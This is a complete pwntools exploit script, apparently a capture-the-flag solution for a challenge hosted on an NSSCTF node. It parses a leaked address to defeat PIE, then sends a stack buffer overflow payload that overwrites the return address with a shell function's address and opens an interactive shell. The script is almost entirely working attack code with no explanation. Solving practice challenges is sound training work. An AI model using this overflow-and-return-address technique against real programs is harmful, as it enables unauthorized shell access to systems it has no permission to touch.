from pwn import *

# io = process("./pwn")
io = connect("node5.anna.nssctf.cn", 22825)

context.gdb_binary = "/bin/pwndbg"

io.recvuntil(b"0x")
shell_addr = 0x80f

main_addr = int(io.recv(8), 16)
base_addr = main_addr & ~0xFFF
shell_addr += base_addr

io.recvuntil(b"Input:")
payload = b'a' * (0x28 + 4) + p32(shell_addr)
#gdb.attach(io)
io.sendline(payload)
io.interactive()
io.close()
